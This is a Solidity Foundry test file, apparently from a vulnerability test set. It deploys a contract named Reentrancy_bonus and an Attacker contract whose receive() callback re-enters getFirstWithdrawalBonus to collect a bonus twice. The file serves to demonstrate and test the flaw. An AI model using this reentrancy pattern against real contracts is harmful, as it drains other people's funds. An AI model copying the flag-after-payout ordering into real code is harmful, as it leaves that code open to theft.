
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 bonusAmount = 100;
        
        // Fund the victim contract so it has ETH to send as rewards
        vm.deal(address(_contractUnderTest), bonusAmount * 10);

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded - attacker received bonus multiple times
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        
        // Additional verification: attacker should have received more than one bonus
        assertGt(_attacker.attackCallCount(), 1, "Reentrancy did not occur: only one call was made.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public totalReceived;

    constructor(address victimAddress) {
        victim = Reentrancy_bonus(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        totalReceived = 0;

        // Call the vulnerable function - this will trigger the reentrancy
        victim.getFirstWithdrawalBonus(address(this));

        // If we received rewards more than once, the exploit succeeded
        // The vulnerability allows us to get the bonus multiple times before claimedBonus is set
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        totalReceived += msg.value;
        
        // Re-enter on the first callback
        // The vulnerability: claimedBonus[recipient] is set to true AFTER withdrawReward
        // So we can call getFirstWithdrawalBonus again before the flag is set
        if (attackCallCount < 2) {
            // Re-enter the vulnerable function
            // This should succeed because claimedBonus[address(this)] is still false
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
